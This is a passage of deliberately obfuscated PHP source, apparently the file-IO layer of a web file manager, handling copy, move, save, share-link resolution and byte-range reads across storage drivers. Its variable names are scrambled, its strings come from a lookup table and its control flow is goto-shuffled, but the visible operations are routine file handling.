$EÁÏËïƒˆ™), $bõ‚İÛ÷¹); } else { $AºƒÖÉÜÁŠ = call_user_func_array(array(parent, $EÁÏËïƒˆ™), $bõ‚İÛ÷¹); } } } goto E—©ËÓâ; E—©ËÓâ: Hook::trigger($dËäĞ£­åß[995] . $EÁÏËïƒˆ™ . $dËäĞ£­åß[998], $BÓ„„ø¼˜, $AºƒÖÉÜÁŠ); return $AºƒÖÉÜÁŠ; goto AœÜ°ñ¹; FÍìÙ‹­©©: $dËäĞ£­åß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BÓ„„ø¼˜ = $bõ‚İÛ÷¹; $GLOBALS[$dËäĞ£­åß[994]] = $dËäĞ£­åß[995] . $EÁÏËïƒˆ™; goto Aóö õÛ…; AœÜ°ñ¹: } public static function init($A˜‚Ò×µ×Ã) { return self::driverMake($A˜‚Ò×µ×Ã); } public static function copy($aÀˆÑÏÌî®, $e‚¤¡³›³Ö, $E¦…¢ãç—Š = false, $EŒ§ªÜÉ™¯ = false) { return self::copyMoveStart($aÀˆÑÏÌî®, $e‚¤¡³›³Ö, $E¦…¢ãç—Š, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][507], $EŒ§ªÜÉ™¯); } public static function move($cí‰ÆÚƒÚ, $e†¥ÂÃßœø, $C¿ç²’Äé… = false, $b¡ì©¡¼Õ¬ = false) { return self::copyMoveStart($cí‰ÆÚƒÚ, $e†¥ÂÃßœø, $C¿ç²’Äé…, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][509], $b¡ì©¡¼Õ¬); } private static function copyMoveStart($dÖ‚šïç°, $cÀ‡œÙÖë, $Bô¢¢­¥É–, $A¼®˜§ëâ, $fµ‚‘Ê®á§) { $dÛÜƒõÓØ¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÃ¶ï«åê§ = array($dÖ‚šïç°, $cÀ‡œÙÖë, $Bô¢¢­¥É–, $fµ‚‘Ê®á§); Hook::trigger($dÛÜƒõÓØ¿[995] . $A¼®˜§ëâ . $dÛÜƒõÓØ¿[996], $fÃ¶ï«åê§); $DÉöÄÌéÓ‡ = self::copyMove($dÖ‚šïç°, $cÀ‡œÙÖë, $Bô¢¢­¥É–, $A¼®˜§ëâ, $fµ‚‘Ê®á§); Hook::trigger($dÛÜƒõÓØ¿[995] . $A¼®˜§ëâ . $dÛÜƒõÓØ¿[998], $fÃ¶ï«åê§, $DÉöÄÌéÓ‡); return $DÉöÄÌéÓ‡; } public static function saveFile($F¸´…÷åØÁ, $c”›…Üœ¢š, $C‡é¥®ó‹Ö = true) { goto c†áõÉë×­; CôãÊÔÈ„: $B”ö–ƒˆïé = self::driverMake($c”›…Üœ¢š); $fÄ„‹Ñ­å® = !1; if ($B”ö–ƒˆïé->pathParse[$fõâÚ¯³Ú[999]]) { $D¨Ìå÷èšÃ = $B”ö–ƒˆïé->pathParse[$fõâÚ¯³Ú[999]]; $fÄ„‹Ñ­å® = $B”ö–ƒˆïé; $B”ö–ƒˆïé = self::driverMake($D¨Ìå÷èšÃ); } goto A¤¿ÇÁÑÊì; c†áõÉë×­: $fõâÚ¯³Ú =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aç‡¯ã¡Şí = self::info($c”›…Üœ¢š); $Aˆ’‰–ŠË = self::driverMake($F¸´…÷åØÁ); goto CôãÊÔÈ„; B¸ŞóêÙ«ê: $eé›à”ìÂ = self::copyFile($Aˆ’‰–ŠË, $F¸´…÷åØÁ, $B”ö–ƒˆïé, $d¿Ìø½õ¦ˆ, $Aç‡¯ã¡Şí[$fõâÚ¯³Ú[28]], $bŒÂà¿Ğ¬Ê); if ($fÄ„‹Ñ­å®) { $eé›à”ìÂ = $fÄ„‹Ñ­å®->getPathOuter($eé›à”ìÂ); } return $eé›à”ìÂ; goto Fèˆ¶ÁÃÒ”; A¤¿ÇÁÑÊì: $d¿Ìø½õ¦ˆ = $B”ö–ƒˆïé->pathFather($c”›…Üœ¢š); $bŒÂà¿Ğ¬Ê = !0; if (!$C‡é¥®ó‹Ö && self::driverIsSame($Aˆ’‰–ŠË, $B”ö–ƒˆïé)) { $bŒÂà¿Ğ¬Ê = !1; } goto B¸ŞóêÙ«ê; Fèˆ¶ÁÃÒ”: } private static function copyMove($B³–›Öö¼„, $AÖ×áååƒƒ, $bòó§Ø¾‚, $C¬‚¦óÅµé, $DÔŞÊ®áÉ = false) { goto aê ğâ¼¡ç; fÓçíåÄæˆ: $fò©‹ ·¯ = $D»ãâ¡¤Ã->isFile($B³–›Öö¼„); if (!$fò©‹ ·¯ && $B‡‚ÎÇ²—Ğ->getType() == $BìÖÏÌÁÌ’[688] && $D»ãâ¡¤Ã->getType() == $BìÖÏÌÁÌ’[105]) { $bİÓØéãë† = $B‡‚ÎÇ²—Ğ->copyFolderFromIO($D»ãâ¡¤Ã, $B³–›Öö¼„, $AÖ×áååƒƒ, $bòó§Ø¾‚, $a¢ä¹ÔË†‹, $DÔŞÊ®áÉ); } else { $bİÓØéãë† = self::copyPath($D»ãâ¡¤Ã, $B³–›Öö¼„, $B‡‚ÎÇ²—Ğ, $AÖ×áååƒƒ, $bòó§Ø¾‚, $a¢ä¹ÔË†‹, $fò©‹ ·¯, $DÔŞÊ®áÉ); } if ($bİÓØéãë† && $a¢ä¹ÔË†‹) { $D»ãâ¡¤Ã->remove($B³–›Öö¼„); } goto A§íØªÙ°‘; F¾ÄÔˆá‘˜: Hook::trigger($BìÖÏÌÁÌ’[72], $D»ãâ¡¤Ã, $B³–›Öö¼„, $B‡‚ÎÇ²—Ğ, $AÖ×áååƒƒ); $a‰ÌŞ«Ìİ‹ = self::driverIsSame($D»ãâ¡¤Ã, $B‡‚ÎÇ²—Ğ); if ($a‰ÌŞ«Ìİ‹) { if ($C¬‚¦óÅµé == $BìÖÏÌÁÌ’[509] && !method_exists($B‡‚ÎÇ²—Ğ, $BìÖÏÌÁÌ’[1000]) && trim($AÖ×áååƒƒ, $BìÖÏÌÁÌ’[8]) == trim($B‡‚ÎÇ²—Ğ->pathFather($B³–›Öö¼„), $BìÖÏÌÁÌ’[8])) { if ($D»ãâ¡¤Ã->pathThis($B³–›Öö¼„) != $DÔŞÊ®áÉ && !$D»ãâ¡¤Ã->isTypeObject()) { return $D»ãâ¡¤Ã->rename($B³–›Öö¼„, $DÔŞÊ®áÉ); } return $B‡‚ÎÇ²—Ğ->getPathOuter($B³–›Öö¼„); } if (method_exists($B‡‚ÎÇ²—Ğ, $C¬‚¦óÅµé)) { return $B‡‚ÎÇ²—Ğ->{$C¬‚¦óÅµé}($B³–›Öö¼„, $AÖ×áååƒƒ, $bòó§Ø¾‚); } } goto fÓçíåÄæˆ; A§íØªÙ°‘: if ($FõìÏÅ¦Ó) { $bİÓØéãë† = $FõìÏÅ¦Ó->getPathOuter($bİÓØéãë†); } return $bİÓØéãë†; goto aÛ½¡ÆÜ; bŒÖßõ†î†: $D»ãâ¡¤Ã = self::driverMake($B³–›Öö¼„); $B‡‚ÎÇ²—Ğ = self::driverMake($AÖ×áååƒƒ); $a¢ä¹ÔË†‹ = $C¬‚¦óÅµé == $BìÖÏÌÁÌ’[509]; goto FçÖÁÅ‚ÏÂ; aê ğâ¼¡ç: $BìÖÏÌÁÌ’ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$B³–›Öö¼„ || $B³–›Öö¼„ == $BìÖÏÌÁÌ’[8] || !$AÖ×áååƒƒ) { return !1; } ignore_timeout(); goto bŒÖßõ†î†; FçÖÁÅ‚ÏÂ: $FõìÏÅ¦Ó = !1; if ($B‡‚ÎÇ²—Ğ->pathParse[$BìÖÏÌÁÌ’[999]]) { $AÖ×áååƒƒ = $B‡‚ÎÇ²—Ğ->pathParse[$BìÖÏÌÁÌ’[999]]; $FõìÏÅ¦Ó = $B‡‚ÎÇ²—Ğ; $B‡‚ÎÇ²—Ğ = self::driverMake($AÖ×áååƒƒ); } self::check($D»ãâ¡¤Ã, $B³–›Öö¼„, $B‡‚ÎÇ²—Ğ, $AÖ×áååƒƒ); goto F¾ÄÔˆá‘˜; aÛ½¡ÆÜ: } private static function check($C’ÔÏ´Æå, $d‡Ñöƒ×†—, $eìÎ±‡ßï, &$C„İ±õÒùİ) { $DØ®‘‡¨ª¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (self::driverIsSame($C’ÔÏ´Æå, $eìÎ±‡ßï) && $C’ÔÏ´Æå->isFolder($d‡Ñöƒ×†—) && $C’ÔÏ´Æå->isParentOf($d‡Ñöƒ×†—, $C„İ±õÒùİ)) { show_json(LNG($DØ®‘‡¨ª¢[1001]), !1); } if (!$C’ÔÏ´Æå->exist($d‡Ñöƒ×†—)) { show_json(LNG($DØ®‘‡¨ª¢[104]), !1); } } private static function copyPath($F¸áá×‰Ø‰, $fÌÆã­Êƒ, $fğ¢¤Ë™Ïª, $BŸ˜ÈµÅ££, $C‹ÕŒÁó—ª, $Bº¥È‡Ä¨, $a©éË¡“—‡, $bÀø¯´¡¢Ù = false) { goto f®µ÷«›çà; f®µ÷«›çà: $A­µİ¢ö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e’·¤ØÃ«ê = $bÀø¯´¡¢Ù ? $bÀø¯´¡¢Ù : $F¸áá×‰Ø‰->pathThis($fÌÆã­Êƒ); if ($C‹ÕŒÁó—ª) { $b…‚Š¥²äœ = $fğ¢¤Ë™Ïª->fileNameExist($BŸ˜ÈµÅ££, $e’·¤ØÃ«ê); $e’·¤ØÃ«ê = $fğ¢¤Ë™Ïª->fileNameAuto($BŸ˜ÈµÅ££, $e’·¤ØÃ«ê, $C‹ÕŒÁó—ª, !$a©éË¡“—‡); $C‹ÕŒÁó—ª = $b…‚Š¥²äœ ? $C‹ÕŒÁó—ª : !1; } goto a»ñ…ÅÌ—Æ; e†¡©æÔ©: $EÑù¼•‰¸ß = $fğ¢¤Ë™Ïª->mkdir($fğ¢¤Ë™Ïª->getPath($d±à‡Ï«Šó)); $BŸ˜ÈµÅ££ = $fğ¢¤Ë™Ïª->getPathInner($EÑù¼•‰¸ß); $Eä†ŠÃ·ÇŒ = $F¸áá×‰Ø‰->listPath($fÌÆã­Êƒ, !0); goto F³ ëÀêö¾; F³ ëÀêö¾: $CëÅó¬Œß = array_merge($Eä†ŠÃ·ÇŒ[$A­µİ¢ö[73]], $Eä†ŠÃ·ÇŒ[$A­µİ¢ö[74]]); foreach ($CëÅó¬Œß as $EŸ‡¶ÚàÙÍ) { $fÎ®òØ“Ëâ = $EŸ‡¶ÚàÙÍ[$A­µİ¢ö[29]] == $A­µİ¢ö[173]; $fÌÆã­Êƒ = $F¸áá×‰Ø‰->getPathInner($EŸ‡¶ÚàÙÍ[$A­µİ¢ö[75]]); $Eñ÷ÆÈ¶§ò = self::copyPath($F¸áá×‰Ø‰, $fÌÆã­Êƒ, $fğ¢¤Ë™Ïª, $BŸ˜ÈµÅ££, $C‹ÕŒÁó—ª, $Bº¥È‡Ä¨, $fÎ®òØ“Ëâ); if (!$Eñ÷ÆÈ¶§ò) { IO::errorTips($A­µİ¢ö[1002] . $fÌÆã­Êƒ . $A­µİ¢ö[66] . $BŸ˜ÈµÅ££); } } return $EÑù¼•‰¸ß; goto CŞ×Ñ¼æå; a»ñ…ÅÌ—Æ: if ($a©éË¡“—‡) { return self::copyFile($F¸áá×‰Ø‰, $fÌÆã­Êƒ, $fğ¢¤Ë™Ïª, $BŸ˜ÈµÅ££, $e’·¤ØÃ«ê, $Bº¥È‡Ä¨); } if ($C‹ÕŒÁó—ª == REPEAT_RENAME_FOLDER) { $C‹ÕŒÁó—ª = !1; } $d±à‡Ï«Šó = rtrim($BŸ˜ÈµÅ££, $A­µİ¢ö[8]) . $A­µİ¢ö[8] . $e’·¤ØÃ«ê; goto e†¡©æÔ©; CŞ×Ñ¼æå: } private static function copyFile($bÎ×ƒ¯¨Ÿ, $aÖ¤Ò² ¡¼, $Aß°‚¾Š‰â, $EŠŠèƒ©–‹, $FËĞ¶İ¸îà, $f›ì§ÊÚñÍ) { goto e†²²¬Í‡Ë; FäÀÌöÆ¼‹: mk_dir($aôİŠåÛŠ); $DÓŞŠ¦¾ºõ = $aôİŠåÛŠ . $fšäùí‹ô²; $DÓŞŠ¦¾ºõ = $bÎ×ƒ¯¨Ÿ->download($aÖ¤Ò² ¡¼, $DÓŞŠ¦¾ºõ); goto dª„ê¶²œ; e†²²¬Í‡Ë: $BÑÓ“‰ã¾§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EŠŠèƒ©–‹ = $Aß°‚¾Š‰â->getPath(rtrim($EŠŠèƒ©–‹, $BÑÓ“‰ã¾§[8]) . $BÑÓ“‰ã¾§[8] . $FËĞ¶İ¸îà); $fšäùí‹ô² = $BÑÓ“‰ã¾§[1003] . time() . rand_string(5); goto c’š½ºÖñ¼; c’š½ºÖñ¼: Hook::trigger($BÑÓ“‰ã¾§[1004], $bÎ×ƒ¯¨Ÿ, $aÖ¤Ò² ¡¼, $Aß°‚¾Š‰â, $EŠŠèƒ©–‹, $FËĞ¶İ¸îà, $fšäùí‹ô²); if (self::driverIsSame($bÎ×ƒ¯¨Ÿ, $Aß°‚¾Š‰â)) { if ($f›ì§ÊÚñÍ) { $CÌ¥¿®Åó = $Aß°‚¾Š‰â->moveFile($aÖ¤Ò² ¡¼, $EŠŠèƒ©–‹); } else { $CÌ¥¿®Åó = $Aß°‚¾Š‰â->copyFile($aÖ¤Ò² ¡¼, $EŠŠèƒ©–‹); } Hook::trigger($BÑÓ“‰ã¾§[1005], $bÎ×ƒ¯¨Ÿ, $aÖ¤Ò² ¡¼, $Aß°‚¾Š‰â, $EŠŠèƒ©–‹, $FËĞ¶İ¸îà, $CÌ¥¿®Åó); return $CÌ¥¿®Åó; } $aôİŠåÛŠ = TEMP_FILES; goto FäÀÌöÆ¼‹; f²±Üƒ¿: Hook::trigger($BÑÓ“‰ã¾§[1005], $bÎ×ƒ¯¨Ÿ, $aÖ¤Ò² ¡¼, $Aß°‚¾Š‰â, $EŠŠèƒ©–‹, $FËĞ¶İ¸îà, $CÌ¥¿®Åó); return $CÌ¥¿®Åó; goto FÂÕÌÇ¨; dª„ê¶²œ: $DÓŞŠ¦¾ºõ = $bÎ×ƒ¯¨Ÿ->iconvApp($DÓŞŠ¦¾ºõ); $CÌ¥¿®Åó = $Aß°‚¾Š‰â->upload($EŠŠèƒ©–‹, $DÓŞŠ¦¾ºõ, $f›ì§ÊÚñÍ); self::remove($aôİŠåÛŠ . $fšäùí‹ô²); goto f²±Üƒ¿; FÂÕÌÇ¨: } public static function pathFather($E‘†ğ¾çŞ) { $eåÅ°ˆÛº = IO::init($E‘†ğ¾çŞ); $dóóğä…¦‹ = $eåÅ°ˆÛº->pathFather($eåÅ°ˆÛº->path); return $eåÅ°ˆÛº->getPathOuter($dóóğä…¦‹); } public static function fileOut($f…–£šëÂ, $EÍİ£òç‹ç = false, $b÷ ¡’Şåæ = false, $Cœ‡òÛ¹˜× = '') { $d­†•Ìê«• = self::driverMake($f…–£šëÂ); if ($d­†•Ìê«•->isFileOutServer()) { return $d­†•Ìê«•->fileOutServer($f…–£šëÂ, $EÍİ£òç‹ç, $b÷ ¡’Şåæ, $Cœ‡òÛ¹˜×); } return $d­†•Ìê«•->fileOut($f…–£šëÂ, $EÍİ£òç‹ç, $b÷ ¡’Şåæ, $Cœ‡òÛ¹˜×); } public static function fileOutImage($Aš³•˜ˆó, $FäÙÁ–Õ» = 250) { $BÒàµ‚èƒ = array(250, 600, 1200, 3000, 5000); for ($Bä²µæ‚Ø— = 0; $Bä²µæ‚Ø— < count($BÒàµ‚èƒ); $Bä²µæ‚Ø—++) { if ($Bä²µæ‚Ø— == 0 && $FäÙÁ–Õ» <= $BÒàµ‚èƒ[$Bä²µæ‚Ø—]) { $FäÙÁ–Õ» = $BÒàµ‚èƒ[$Bä²µæ‚Ø—]; break; } else { if ($FäÙÁ–Õ» > $BÒàµ‚èƒ[$Bä²µæ‚Ø— - 1] && $FäÙÁ–Õ» <= $BÒàµ‚èƒ[$Bä²µæ‚Ø—]) { $FäÙÁ–Õ» = $BÒàµ‚èƒ[$Bä²µæ‚Ø—]; break; } else { if ($Bä²µæ‚Ø— == count($BÒàµ‚èƒ) - 1 && $FäÙÁ–Õ» > $BÒàµ‚èƒ[$Bä²µæ‚Ø—]) { $FäÙÁ–Õ» = $BÒàµ‚èƒ[$Bä²µæ‚Ø—]; break; } } } } $a‘ÇÀğƒÙà = self::driverMake($Aš³•˜ˆó); if ($a‘ÇÀğƒÙà->isFileOutServer()) { return $a‘ÇÀğƒÙà->fileOutImageServer($Aš³•˜ˆó, $FäÙÁ–Õ»); } return $a‘ÇÀğƒÙà->fileOutImage($Aš³•˜ˆó, $FäÙÁ–Õ»); } private static function driverIsSame($bÇ†‡‰Ìê, $a®¤„ÊÍØ) { goto FìÁ·‹Æ½Ÿ; cÙæèî·Ş¡: if ($bÇ†‡‰Ìê->pathDriver == $a®¤„ÊÍØ->pathDriver) { return !0; } return !1; goto Fèøƒ°˜Û”; dÉØ¬Ø¥­Ì: if ($c¡ß´¢¬‘ != $c…ª¨ Ã´”) { return !1; } if ($c¡ß´¢¬‘ == $b¶ºì÷ÃÜ¨[688]) { return !0; } if ($c¡ß´¢¬‘ == $b¶ºì÷ÃÜ¨[105]) { return !0; } goto cÙæèî·Ş¡; FìÁ·‹Æ½Ÿ: $b¶ºì÷ÃÜ¨ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¡ß´¢¬‘ = $bÇ†‡‰Ìê->getType(); $c…ª¨ Ã´” = $a®¤„ÊÍØ->getType(); goto dÉØ¬Ø¥­Ì; Fèøƒ°˜Û”: } public static function copyUpdate($aÑØØÑÂÜñ, $fõÇ³Š¦»±) { goto CÒïœ»ËÊ¬; báä¨ÔÏÎ: $F—†øŒ‘Ó“ = array(); foreach ($aŠŒ¡Å­—ó as $A”éìíÏ¿‹ => $f×Ğ‘•Ê‚—) { if (isset($f½Î‰šâˆœ[$A”éìíÏ¿‹])) { if ($f×Ğ‘•Ê‚—[$D¹ÔÛˆ·Á[76]] == 1) { continue; } if ($f½Î‰šâˆœ[$A”éìíÏ¿‹][$D¹ÔÛˆ·Á[77]] == $f×Ğ‘•Ê‚—[$D¹ÔÛˆ·Á[77]]) { continue; } } if ($f×Ğ‘•Ê‚—[$D¹ÔÛˆ·Á[76]] == 1) { $F—†øŒ‘Ó“[] = $fõÇ³Š¦»± . $D¹ÔÛˆ·Á[8] . $A”éìíÏ¿‹; continue; } $DÅ¶ëìŞŸô = strstr(trim($A”éìíÏ¿‹, $D¹ÔÛˆ·Á[8]), $D¹ÔÛˆ·Á[8]) ? get_path_father($A”éìíÏ¿‹) : $D¹ÔÛˆ·Á[33]; $e¤‡ÃßœÚõ[] = array($D¹ÔÛˆ·Á[1006] => $f×Ğ‘•Ê‚—[$D¹ÔÛˆ·Á[75]], $D¹ÔÛˆ·Á[1007] => rtrim($fõÇ³Š¦»±, $D¹ÔÛˆ·Á[8]) . $D¹ÔÛˆ·Á[8] . $DÅ¶ëìŞŸô, $D¹ÔÛˆ·Á[1008] => $f×Ğ‘•Ê‚—); } $dÄ¢¶Åñæ£ = array($D¹ÔÛˆ·Á[173] => $e¤‡ÃßœÚõ, $D¹ÔÛˆ·Á[76] => $F—†øŒ‘Ó“); goto dùÁòƒÜ¢; dùÁòƒÜ¢: Hook::trigger($D¹ÔÛˆ·Á[1009], $aÑØØÑÂÜñ, $fõÇ³Š¦»±, $dÄ¢¶Åñæ£); foreach ($F—†øŒ‘Ó“ as $f×Ğ‘•Ê‚—) { IO::mkdir($f×Ğ‘•Ê‚—); } foreach ($e¤‡ÃßœÚõ as $f×Ğ‘•Ê‚—) { IO::copy($f×Ğ‘•Ê‚—[$D¹ÔÛˆ·Á[1006]], $f×Ğ‘•Ê‚—[$D¹ÔÛˆ·Á[1007]], REPEAT_REPLACE); } goto b¬ùó¸øÍ±; b•’¿¹¼ÃØ: $aŠŒ¡Å­—ó = self::_listAll($aÑØØÑÂÜñ); $f½Î‰šâˆœ = self::_listAll($fõÇ³Š¦»±); $e¤‡ÃßœÚõ = array(); goto báä¨ÔÏÎ; CÒïœ»ËÊ¬: $D¹ÔÛˆ·Á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!IO::exist($aÑØØÑÂÜñ)) { return !1; } if (!IO::exist($fõÇ³Š¦»±)) { IO::mkdir($fõÇ³Š¦»±); } goto b•’¿¹¼ÃØ; b¬ùó¸øÍ±: } private static function _listAll($aÉˆèÖ÷¨‘) { $C ¨«·¬—× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÉˆèÖ÷¨‘ = KodIO::clear($aÉˆèÖ÷¨‘); $fµ§©çøÕó = IO::listAll($aÉˆèÖ÷¨‘); foreach ($fµ§©çøÕó as &$Fù¿ÓâÈ¢) { $d­ˆÕ™§ºÄ = substr($Fù¿ÓâÈ¢[$C ¨«·¬—×[75]], strlen($aÉˆèÖ÷¨‘)); $Fù¿ÓâÈ¢[$C ¨«·¬—×[1010]] = trim($d­ˆÕ™§ºÄ, $C ¨«·¬—×[8]); } unset($Fù¿ÓâÈ¢); return array_to_keyvalue($fµ§©çøÕó, $C ¨«·¬—×[1010]); } public static function fileSubstr($eáìÒå»®÷, $dÖâŠ÷‚‚È, $bñÌ”ã„ä£ = false) { goto b–½æ“‰Òµ; b–½æ“‰Òµ: $dæ‡Ÿ‘Ô¡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eêõ×æˆ±„ = self::driverMake($eáìÒå»®÷); $F…¨ÓšŒôŠ = $Eêõ×æˆ±„->size($eáìÒå»®÷); goto Eâ©“»èè¤; A§ÍÃÕó“°: if (!$Fâ•Óº†Æù && $bñÌ”ã„ä£ && isset($GLOBALS[$dæ‡Ÿ‘Ô¡[1013]])) { throw new Exception($GLOBALS[$dæ‡Ÿ‘Ô¡[1013]][$dæ‡Ÿ‘Ô¡[1014]]); } return $Fâ•Óº†Æù; goto e¦î©•÷İ™; Eâ©“»èè¤: $bß‰¥£÷×Ü = $dÖâŠ÷‚‚È; $cğŒÔÏ‡Î = $bñÌ”ã„ä£; if ($dÖâŠ÷‚‚È < 0) { $dÖâŠ÷‚‚È = $F…¨ÓšŒôŠ + $dÖâŠ÷‚‚È; } goto A‹›°õË„ã; A‹›°õË„ã: if ($bñÌ”ã„ä£ === !1) { $bñÌ”ã„ä£ = $F…¨ÓšŒôŠ - $dÖâŠ÷‚‚È; } if ($dÖâŠ÷‚‚È + $bñÌ”ã„ä£ > $F…¨ÓšŒôŠ) { $bñÌ”ã„ä£ = $F…¨ÓšŒôŠ - $dÖâŠ÷‚‚È; } if (!$F…¨ÓšŒôŠ && $Eêõ×æˆ±„->getType() == $dæ‡Ÿ‘Ô¡[105] && !$Eêõ×æˆ±„->exist($eáìÒå»®÷)) { throw new Exception($dæ‡Ÿ‘Ô¡[1011] . LNG($dæ‡Ÿ‘Ô¡[1012])); } goto BÏ¹åœèÒ; BÏ¹åœèÒ: if ($bñÌ”ã„ä£ <= 0) { return $dæ‡Ÿ‘Ô¡[33]; } if ($dÖâŠ÷‚‚È < 0 || $dÖâŠ÷‚‚È >= $F…¨ÓšŒôŠ || $bñÌ”ã„ä£ > 1024 * 1024 * 5) { throw new Exception("\146\151\154\x65\x52\x65\141\x64\x20\x65\x72\x72\x6f\x72\41\x20\x73\164\141\162\x74\x3d{$dÖâŠ÷‚‚È}\x3b\154\145\x6e\147\164\x68\75{$bñÌ”ã„ä£}\73\x20\163\x69\x7a\x65\75{$F…¨ÓšŒôŠ}\x3b"); } $Fâ•Óº†Æù = $Eêõ×æˆ±„->fileSubstr($eáìÒå»®÷, $dÖâŠ÷‚‚È, $bñÌ”ã„ä£); goto A§ÍÃÕó“°; e¦î©•÷İ™: } private static function driverMake(&$c½¶¥Ãñ×á) { goto BÜÀ“²«ë˜; BÜÀ“²«ë˜: $FÇ•äÆÒÙ¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BË¤šïƒ™ = KodIO::parse($c½¶¥Ãñ×á); if (!self::$driverListSystem) { $d²Ö®ïÛ¤ = Model($FÇ•äÆÒÙ¿[697])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($d²Ö®ïÛ¤, $FÇ•äÆÒÙ¿[385]); } goto DÇ…™‡‘ğ‘; b¸šƒ®˜Ï–: return $F—†ôÉ½Ï…; goto CóÇÏ˜¯‰ã; DÇ…™‡‘ğ‘: if ($BË¤šïƒ™[$FÇ•äÆÒÙ¿[29]] == KodIO::KOD_IO && !self::$driverListSystem[$BË¤šïƒ™[$FÇ•äÆÒÙ¿[385]]]) { return !1; } $c½¶¥Ãñ×á = $BË¤šïƒ™[$FÇ•äÆÒÙ¿[1015]]; $F—†ôÉ½Ï… = self::driverGet($BË¤šïƒ™, $c½¶¥Ãñ×á); goto b¸šƒ®˜Ï–; CóÇÏ˜¯‰ã: } private static function driverGet($aš÷åÄè, &$eƒùÎŒ¥¢À) { goto f“¹©‚ÉÄ; AºÈª±ˆåİ: $cÂí‘¼„Ü->path = $eƒùÎŒ¥¢À; return $cÂí‘¼„Ü; goto D»¦¨­ êÑ; dïÙóŞ™è¹: $cÂí‘¼„Ü = self::$driverCache[$FˆÈ½òç‚Ç]; $cÂí‘¼„Ü->pathDriver = $Cê¥¾›®‹æ; $cÂí‘¼„Ü->pathBase = $b˜„õê¥œ§[33]; goto E‹Ì¡ˆìË¡; f“¹©‚ÉÄ: $b˜„õê¥œ§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Cê¥¾›®‹æ = $aš÷åÄè[$b˜„õê¥œ§[1016]]; $a÷®ëİ…‘ = $aš÷åÄè[$b˜„õê¥œ§[385]]; goto EÉ–ˆæøæê; E‹Ì¡ˆìË¡: if (isset($C‘ñ‹ğ×®ğ[$b˜„õê¥œ§[6]][$b˜„õê¥œ§[1027]])) { $cÂí‘¼„Ü->pathBase = rtrim($C‘ñ‹ğ×®ğ[$b˜„õê¥œ§[6]][$b˜„õê¥œ§[1027]], $b˜„õê¥œ§[8]) . $b˜„õê¥œ§[8]; $eƒùÎŒ¥¢À = $cÂí‘¼„Ü->pathBase . ltrim($eƒùÎŒ¥¢À, $b˜„õê¥œ§[8]); } $eƒùÎŒ¥¢À = $cÂí‘¼„Ü->getPath($eƒùÎŒ¥¢À); if (isset($aš÷åÄè[$b˜„õê¥œ§[999]])) { $eƒùÎŒ¥¢À = $aš÷åÄè[$b˜„õê¥œ§[999]]; } goto AºÈª±ˆåİ; EÉ–ˆæøæê: switch ($aš÷åÄè[$b˜„õê¥œ§[29]]) { case KodIO::KOD_IO: $C‘ñ‹ğ×®ğ = self::$driverListSystem[$a÷®ëİ…‘]; break; case KodIO::KOD_SOURCE: $eƒùÎŒ¥¢À = $a÷®ëİ…‘ . $eƒùÎŒ¥¢À; $C‘ñ‹ğ×®ğ = array($b˜„õê¥œ§[1017] => $b˜„õê¥œ§[1018], $b˜„õê¥œ§[6] => $aš÷åÄè); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $a³¬½‰‚ƒ = $GLOBALS[$b˜„õê¥œ§[1019]]; self::$driverListUser = array_to_keyvalue($a³¬½‰‚ƒ, $b˜„õê¥œ§[385]); } $C‘ñ‹ğ×®ğ = self::$driverListUser[$a÷®ëİ…‘]; break; case KodIO::KOD_SHARE_LINK: $C‘ñ‹ğ×®ğ = array($b˜„õê¥œ§[1017] => $b˜„õê¥œ§[1020], $b˜„õê¥œ§[6] => $aš÷åÄè); $BÙ§²Ú–ç” = Action($b˜„õê¥œ§[1021])->sharePathInfo($aš÷åÄè[$b˜„õê¥œ§[75]]); $eƒùÎŒ¥¢À = $BÙ§²Ú–ç”[$b˜„õê¥œ§[387]]; if (!$BÙ§²Ú–ç”[$b˜„õê¥œ§[387]]) { $Bé¨ºê‹Ä‡ = Model($b˜„õê¥œ§[552])->getInfo($BÙ§²Ú–ç”[$b˜„õê¥œ§[457]]); $eƒùÎŒ¥¢À = KodIO::clear($Bé¨ºê‹Ä‡[$b˜„õê¥œ§[1022]] . $aš÷åÄè[$b˜„õê¥œ§[1015]]); $aš÷åÄè[$b˜„õê¥œ§[455]] = $Bé¨ºê‹Ä‡; $aš÷åÄè[$b˜„õê¥œ§[999]] = $eƒùÎŒ¥¢À; $C‘ñ‹ğ×®ğ = array($b˜„õê¥œ§[1017] => $b˜„õê¥œ§[1023], $b˜„õê¥œ§[6] => $aš÷åÄè); } break; case KodIO::KOD_SHARE_ITEM: $C‘ñ‹ğ×®ğ = array($b˜„õê¥œ§[1017] => $b˜„õê¥œ§[1024], $b˜„õê¥œ§[6] => $aš÷åÄè); $Bé¨ºê‹Ä‡ = Model($b˜„õê¥œ§[552])->getInfo($aš÷åÄè[$b˜„õê¥œ§[385]]); if ($Bé¨ºê‹Ä‡[$b˜„õê¥œ§[387]] == $b˜„õê¥œ§[486]) { $eƒùÎŒ¥¢À = KodIO::clear($Bé¨ºê‹Ä‡[$b˜„õê¥œ§[1022]] . $aš÷åÄè[$b˜„õê¥œ§[1015]]); $aš÷åÄè[$b˜„õê¥œ§[455]] = $Bé¨ºê‹Ä‡; $aš÷åÄè[$b˜„õê¥œ§[999]] = $eƒùÎŒ¥¢À; $C‘ñ‹ğ×®ğ = array($b˜„õê¥œ§[1017] => $b˜„õê¥œ§[1025], $b˜„õê¥œ§[6] => $aš÷åÄè); } else { if (!$eƒùÎŒ¥¢À) { $eƒùÎŒ¥¢À = $Bé¨ºê‹Ä‡[$b˜„õê¥œ§[387]]; } } break; default: $eƒùÎŒ¥¢À = 